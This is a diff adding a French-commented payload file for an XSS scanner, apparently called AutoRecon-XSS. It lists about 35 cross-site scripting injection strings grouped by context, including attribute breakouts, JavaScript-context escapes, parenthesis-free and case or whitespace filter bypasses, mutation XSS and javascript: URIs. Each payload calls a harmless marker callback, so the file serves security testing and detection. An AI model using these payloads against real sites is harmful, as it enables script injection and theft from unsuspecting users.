@@ -1,0 +1,50 @@
+# AutoRecon-XSS — payloads DOM (exécution confirmée via Playwright, --dom-payloads).
+# Convention :
+#   TOKEN   -> window.__arxcb('<marqueur>')        (appel normal)
+#   TOKENBT -> window.__arxcb`<marqueur>`           (sans parenthèses, tagged template)
+# Un hit = l'entrée atteint un sink exécutable côté client.
+# Adapté de PayloadsAllTheThings (swisskyrepo). Usage autorisé uniquement.
+
+# --- html-body / tag : ouverture directe ---
+<img src=x onerror=TOKEN>
+<svg onload=TOKEN>
+<svg/onload=TOKEN>
+<video><source onerror=TOKEN>
+<audio src=x onerror=TOKEN>
+<details open ontoggle=TOKEN>
+<marquee onstart=TOKEN>
+<meter value=2 min=0 max=10 onmouseover=TOKEN>x</meter>
+<body onpageshow=TOKEN>
+<input autofocus onfocus=TOKEN>
+
+# --- breakout d'attribut ---
+"><img src=x onerror=TOKEN>
+'><img src=x onerror=TOKEN>
+"><svg onload=TOKEN>
+" autofocus onfocus=TOKEN x="
+' autofocus onfocus=TOKEN x='
+"><details open ontoggle=TOKEN>
+
+# --- contexte JavaScript ---
+';TOKEN;//
+";TOKEN;//
+'-TOKEN-'
+`;TOKEN;//
+</script><svg onload=TOKEN>
+
+# --- bypass : sans parenthèses (filtres bloquant "()") ---
+<svg onload=TOKENBT>
+"><img src=x onerror=TOKENBT>
+<details open ontoggle=TOKENBT>
+
+# --- bypass : casse / espaces ---
+"><sVg OnLoad=TOKEN>
+"><svg	onload=TOKEN>
+"><svg/onload=TOKEN //
+
+# --- mutation XSS (noscript) ---
+<noscript><p title="</noscript><img src=x onerror=TOKEN>">
+
+# --- URI wrapper ---
+<a href="javascript:TOKEN">x</a>
+<iframe src="javascript:TOKEN">
